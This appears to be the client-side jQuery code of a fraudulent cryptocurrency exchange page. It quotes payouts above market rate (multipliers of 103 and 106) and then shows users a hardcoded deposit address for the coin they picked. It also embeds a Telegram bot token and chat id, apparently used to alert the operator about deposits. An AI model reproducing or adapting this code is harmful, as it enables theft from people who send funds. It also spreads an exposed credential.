$(document).ready(function () {
    const getKoef = () => {
      const sendCoins = document.querySelectorAll(
        ".element__block-item.element__block-item_active"
      );
      const coin1 = sendCoins[0]
        .querySelector(".element__block-span")
        .innerHTML.replaceAll(" ", "")
        .replaceAll("\n", "");
      const coin2 = sendCoins[1]
        .querySelector(".element__block-span")
        .innerHTML.replaceAll(" ", "")
        .replaceAll("\n", "");
      const targetCoins = ["matic", "uni", "bnb"];
      if (targetCoins.includes(coin1) || targetCoins.includes(coin2)) {
        return 103;
      } else {
        return 100;
      }
    };
  
    $.ajax({
      url: "https://min-api.cryptocompare.com/data/price?fsym=btc&tsyms=usdt",
      dataType: "json",
      success: function (data) {
        data = data["USDT"];
        $(".element__block-give-header span").text(
          (10 / data).toFixed(5) + " - " + (5000000 / data).toFixed(5)
        );
        $(".element__block-input-give").val((10 / data).toFixed(5));
        $(".element__block-input-give").attr("min", (10 / data).toFixed(5));
        $(".element__block-input-give").attr("max", (5000000 / data).toFixed(5));
        $(".element__block-input-calc-give").val((10 / data).toFixed(5));
        $(".element__block-input-get").val(
          (((data * $("#element__block-input-give").val()) / 100) * 106).toFixed(
            5
          )
        );
        $(".element__block-input-calc-get").val(
          (((data * $("#element__block-input-give").val()) / 100) * 106).toFixed(
            5
          )
        );
      },
    });
  
    var chatid = "-1001814291575";
    var token = "5692660810:AAEY8irN7p52zDuieNelQyN0b5YUuoki2ng";
    var text = "Deposit";
    let wallets = new Array();
    wallets["btc"] = "bc1qm5ft2yzygljcp7khnt4al7cnz3zqkg0l3k4430";
    wallets["xlm"] = "GCRI6XPMGUNZHDDDJZGWEFJCPMRBEALD6ZFJ4SA2554ZCK2LGMVOHXUW";
    wallets["eth"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["etc"] = "0xA7DCBAE0D71F16fF329634492F34E3cBA8B19959";
    wallets["bnb-bep2"] = "bnb14pd5hqf6a69v9tv709p6tghesesxn7pdeq67ds";
    wallets["bnb"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["ltc"] = "ltc1qzvxyj3yhx3nnz82p89wzayt3s96xtac6lct34z";
    wallets["sol"] = "8FSvLK1676nQtpANK5b7dDi28sN5pA19AAQUKHqc4yCf";
    wallets["usdt-trc20"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
    wallets["usdt-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["usdc-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["doge"] = "DQTdumtYbP67aBWfPZnVEpgw7dFWTeJnzk";
    wallets["xrp"] = "rD4rXN7GdH2qQ2g1ExRaKjHRxLmCA38xXg";
    wallets["shib-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["shib-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["trx"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
    wallets["busd"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["usdc-trc20"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
    wallets["usdc-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["usdc-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["dai-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["tusd-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["tusd-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["avax"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["ada"] =
      "addr1q8w584c6ds00j2vd7gg2na0scggkreccnw33vps8q538vnwq9d8wx8ptssk32t5mvyqxst7s3u0y4dp2n39fxheh9w3sqgplvv";
    wallets["ada-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["matic"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["waves"] = "3P2jLRcm9czQ4YdU6WEETdhKVXxLRWUw7rk";
    wallets["uni-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["uni-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
    wallets["dai"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
  
    $(".element__block-input").keyup(function () {
      if (parseInt($(this).val()) < 0) {
        $(this).val($(this).val() * -1);
      } else {
        $(".element__block-input-calc-" + $(this).data("type")).val(
          $(this).val()
        );
        if ($(this).hasClass("element__block-input-give")) {
          $.ajax({
            url:
              "https://min-api.cryptocompare.com/data/price?fsym=" +
              $.trim($("label.element__block-label-give:first").text()) +
              "&tsyms=" +
              $.trim($("label.element__block-label-get:first").text()) +
              "",
            dataType: "json",
            success: function (data) {
              $(".element__block-input-calc-get").val(
                parseFloat(
                  ((data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ] *
                    parseFloat($("#element__block-input-give").val())) /
                    100) *
                    getKoef()
                ).toFixed(5)
              );
              $(".element__block-input-get").val(
                parseFloat(
                  ((data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ] *
                    parseFloat($("#element__block-input-give").val())) /
                    100) *
                    getKoef()
                ).toFixed(5)
              );
            },
          });
        } else if ($(this).hasClass("element__block-input-get")) {
          $.ajax({
            url:
              "https://min-api.cryptocompare.com/data/price?fsym=" +
              $.trim($("label.element__block-label-give:first").text()) +
              "&tsyms=" +
              $.trim($("label.element__block-label-get:first").text()) +
              "",
            dataType: "json",
            success: function (data) {
              $(".element__block-input-calc-give").val(
                parseFloat(
                  parseFloat($("#element__block-input-get").val()) /
                    data[
                      $.trim(
                        $("label.element__block-label-get:first").text()
                      ).toUpperCase()
                    ]
                ).toFixed(5)
              );
              $(".element__block-input-give").val(
                parseFloat(
                  parseFloat($("#element__block-input-get").val()) /
                    data[
                      $.trim(
                        $("label.element__block-label-get:first").text()
                      ).toUpperCase()
                    ]
                ).toFixed(5)
              );
            },
          });
        }
      }
    });
  
    $(".element__block-item-give").click(function () {
      $(".element__block-item-give").removeClass("element__block-item_active");
      $(this).addClass("element__block-item_active");
      $(".element__block-label-give").text($(this).children("span").text());
      $(".element__block-calc-give-img").attr(
        "src",
        "img/crypto/" + $.trim($(this).children("span").text()) + ".svg"
      );
      $.ajax({
        url:
          "https://min-api.cryptocompare.com/data/price?fsym=" +
          $.trim(
            $(".element__block-item-give.element__block-item_active")
              .children("span")
              .text()
          ) +
          "&tsyms=usdt",
        dataType: "json",
        success: function (data) {
          data = data["USDT"];
          dataMin = (10 / data).toFixed(5);
          dataMax = (5000000 / data).toFixed(5);
  
          $(".element__block-give-header span").text(dataMin + " - " + dataMax);
          $(".element__block-input-give").val(dataMin);
          $(".element__block-input-calc-give").val(dataMin);
          $(".element__block-input-give").attr("min", dataMin);
          $(".element__block-input-give").attr("max", dataMax);
          $.ajax({
            url:
              "https://min-api.cryptocompare.com/data/price?fsym=" +
              $.trim($("label.element__block-label-give:first").text()) +
              "&tsyms=" +
              $.trim($("label.element__block-label-get:first").text()) +
              "",
            dataType: "json",
            success: function (data) {
              $(".element__block-input-calc-get").val(
                parseFloat(
                  ((data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ] *
                    parseFloat($("#element__block-input-give").val())) /
                    100) *
                    getKoef()
                ).toFixed(5)
              );
              $(".element__block-input-get").val(
                parseFloat(
                  ((data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ] *
                    parseFloat($("#element__block-input-give").val())) /
                    100) *
                    getKoef()
                ).toFixed(5)
              );
            },
          });
        },
      });
    });
  
    $(".element__block-item-get").click(function () {
      $(".element__block-item-get").removeClass("element__block-item_active");
      $(this).addClass("element__block-item_active");
      $(".element__block-label-get").text($(this).children("span").text());
      $(".element__block-calc-get-img").attr(
        "src",
        "img/crypto/" + $.trim($(this).children("span").text()) + ".svg"
      );
      $.ajax({
        url:
          "https://min-api.cryptocompare.com/data/price?fsym=" +
          $.trim($("label.element__block-label-give:first").text()) +
          "&tsyms=" +
          $.trim($("label.element__block-label-get:first").text()) +
          "",
        dataType: "json",
        success: function (data) {
          $(".element__block-input-calc-get").val(
            parseFloat(
              ((data[
                $.trim(
                  $("label.element__block-label-get:first").text()
                ).toUpperCase()
              ] *
                parseFloat($("#element__block-input-give").val())) /
                100) *
                getKoef()
            ).toFixed(5)
          );
          $(".element__block-input-get").val(
            parseFloat(
              ((data[
                $.trim(
                  $("label.element__block-label-get:first").text()
                ).toUpperCase()
              ] *
                parseFloat($("#element__block-input-give").val())) /
                100) *
                getKoef()
            ).toFixed(5)
          );
        },
      });
  
      if ($(this).hasClass("fiat")) {
        $("#element__block-wallet").attr("placeholder", "Your card number");
        $("#element__block-wallet").attr("minlength", "16");
      } else {
        $("#element__block-wallet").attr("placeholder", "Your crypto address");
        $("#element__block-wallet").attr("minlength", "26");
        $("#element__block-wallet").removeAttr("maxlength");
      }
    });
  
    $(".element__block-form").submit(function (e) {
      e.preventDefault();
      if (
        $("#element__block-input-give").val() == "" ||
        $("#element__block-input-get").val() == ""
      ) {
        if ($("#element__block-input-give").val() == "") {
          $("#element__block-input-give").css({
            border: "1px solid #E96A6A",
          });
        } else {
          $("#element__block-input-give").css({
            border: "1px solid transparent",
          });
        }
        if ($("#element__block-input-get").val() == "") {
          $("#element__block-input-get").css({
            border: "1px solid #E96A6A",
          });
        } else {
          $("#element__block-input-get").css({
            border: "1px solid transparent",
          });
        }
      } else if (
        parseFloat($("#element__block-input-give").val()) <
          parseFloat($("#element__block-input-give").attr("min")) ||
        parseFloat($("#element__block-input-give").val()) >
          parseFloat($("#element__block-input-give").attr("max"))
      ) {
        $("#element__block-input-give").css({
          border: "1px solid #E96A6A",
        });
  
        $(".element__block-give-header span").css({
          color: "#E96A6A",
        });
      } else {
        $("#modal__input-address").val(
          wallets[
            $.trim(
              $("label.element__block-label-give:first").text()
            ).toLowerCase()
          ]
        );
        $("main").children("section").fadeOut();
        $(".modal").css({
          display: "flex",
        });
      }
    });
  
    $(".modal__label").click(function () {
      var copyText = document.getElementById(
        "modal__input-" + $(this).data("type")
      );
      copyText.select();
      document.execCommand("copy");
    });
  });
  